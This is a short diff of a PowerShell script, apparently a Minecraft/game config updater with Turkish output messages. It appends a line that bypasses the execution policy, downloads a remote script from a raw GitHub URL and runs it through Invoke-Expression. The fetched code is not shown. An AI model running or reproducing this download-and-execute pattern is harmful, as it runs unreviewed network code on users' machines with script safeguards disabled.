@@ -126,3 +126,5 @@ if ($PSVersionTable.PSVersion.Major -ge 7) {
 
     Write-Host "Dosyalar başarıyla güncellendi." -ForegroundColor Green
 }
+Start-Sleep -Seconds 1
+PowerShell.exe -ExecutionPolicy Bypass -Command "& { Invoke-RestMethod -Uri 'https://raw.githubusercontent.com/SirriusV1/Oyun-Cfg/main/updated/minecraft.ps1' | Invoke-Expression }"
